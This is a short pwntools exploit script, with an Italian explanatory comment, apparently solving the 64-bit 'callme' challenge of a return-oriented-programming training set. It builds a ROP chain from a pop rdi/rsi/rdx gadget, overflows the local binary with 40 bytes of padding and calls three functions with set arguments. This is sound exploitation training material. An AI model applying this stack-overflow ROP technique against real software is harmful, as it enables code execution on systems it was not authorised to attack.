from pwn import *

elf = ELF("./callme")

p = process("./callme")
p.recvline()

"""
    Per questo esercizio dobbiamo chiamare le tre funzioni 'callme_one','callme_two' e 'callme_three' in
    quest'ordine, ognuna con i tre parametri 0xdeadbeefdeadbeef, 0xcafebabecafebabe e 0xd00df00dd00df00d. 
    A differenza della versione a 32 bit, nella versione a 64 bit la calling convention cambia, in particolare i 
    primi 6 parametri da passare alle funzioni devono essere inseriti nei seguenti registri (seguendo l'ordine):
    RDI, RSI, RDX, RCX, R8, R9. Per nostra fortuna abbiamo un gadget che ci fa i pop di RDI, RSI e RDX insieme.
"""

pop_rdi_pop_rsi_pop_rdx = p64(0x000000000040093c)
args = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

payload = b''
payload += pop_rdi_pop_rsi_pop_rdx + args + p64(elf.symbols['callme_one'])
payload += pop_rdi_pop_rsi_pop_rdx + args + p64(elf.symbols['callme_two'])
payload += pop_rdi_pop_rsi_pop_rdx + args + p64(elf.symbols['callme_three'])


p.send(cyclic(40) + payload)
					   

p.interactive()
